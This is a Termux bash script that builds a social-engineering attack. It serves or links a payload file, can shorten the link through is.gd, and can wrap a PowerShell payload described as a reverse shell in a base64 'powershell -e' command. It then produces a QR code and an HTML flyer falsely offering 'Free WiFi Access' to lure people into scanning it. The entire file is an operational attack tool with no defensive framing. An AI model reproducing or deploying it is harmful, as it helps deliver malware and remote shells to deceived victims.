#!/data/data/com.termux/files/usr/bin/bash

OUTPUT_DIR="./output"
mkdir -p "$OUTPUT_DIR"

read -p "[+] Enter payload URL or local file path: " PAYLOAD_INPUT

# If it's a file, serve it via HTTP and construct URL
if [[ -f "$PAYLOAD_INPUT" ]]; then
    BASENAME=$(basename "$PAYLOAD_INPUT")
    cp "$PAYLOAD_INPUT" "$OUTPUT_DIR/$BASENAME"

    LAN_IP=$(ip a | grep inet | grep wlan | awk '{print $2}' | cut -d/ -f1 | head -n1)
    PAYLOAD_URL="http://$LAN_IP:8000/$BASENAME"
else
    PAYLOAD_URL="$PAYLOAD_INPUT"
fi

read -p "[?] Shorten URL with is.gd? (y/N): " SHORTEN
if [[ "$SHORTEN" =~ ^[Yy]$ ]]; then
    SHORTENED=$(curl -s "https://is.gd/create.php?format=simple&url=$PAYLOAD_URL")
    if [[ "$SHORTENED" != "" ]]; then
        PAYLOAD_URL="$SHORTENED"
    fi
fi

read -p "[?] Obfuscate payload (Base64 encode + PS reverse shell)? (y/N): " CLOAK
if [[ "$CLOAK" =~ ^[Yy]$ && -f "$OUTPUT_DIR/$BASENAME" ]]; then
    ENCODED=$(base64 "$OUTPUT_DIR/$BASENAME" | tr -d '\n')
    OBF_PSH="powershell -e $ENCODED"
    OBF_NAME="${BASENAME%.ps1}_obfuscated.ps1"
    echo "$OBF_PSH" > "$OUTPUT_DIR/$OBF_NAME"
    PAYLOAD_URL="http://$LAN_IP:8000/$OBF_NAME"
fi

TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
QR_PNG="$OUTPUT_DIR/qr_payload_$TIMESTAMP.png"
HTML_OUT="$OUTPUT_DIR/flyer_$TIMESTAMP.html"

echo "[*] Generating QR code..."
python3 -c "import qrcode; img = qrcode.make('$PAYLOAD_URL'); img.save('$QR_PNG')"
python3 -c "import qrcode_terminal; qrcode_terminal.draw('$PAYLOAD_URL')"

# Create HTML flyer with embedded QR
cat <<EOF > "$HTML_OUT"
<!DOCTYPE html>
<html>
<head><title>Free WiFi Access</title></head>
<body style="text-align:center; font-family:sans-serif;">
<h2>Connect to Free WiFi</h2>
<p>Scan the QR code below to claim access</p>
<img src="qr_payload_$TIMESTAMP.png" alt="QR Code">
<p><small>This link is valid for 24 hours.</small></p>
</body>
</html>
EOF

# Copy URL to clipboard if Termux API is available
if command -v termux-clipboard-set >/dev/null 2>&1; then
    echo "$PAYLOAD_URL" | termux-clipboard-set
    echo "[*] Payload URL copied to clipboard."
fi

# Save to log
echo "[$TIMESTAMP] $PAYLOAD_URL → $QR_PNG" >> "$OUTPUT_DIR/qr_log.txt"

echo "[✓] PNG saved to: $QR_PNG"
echo "[✓] HTML flyer saved to: $HTML_OUT"
echo "[✓] Payload URL: $PAYLOAD_URL"
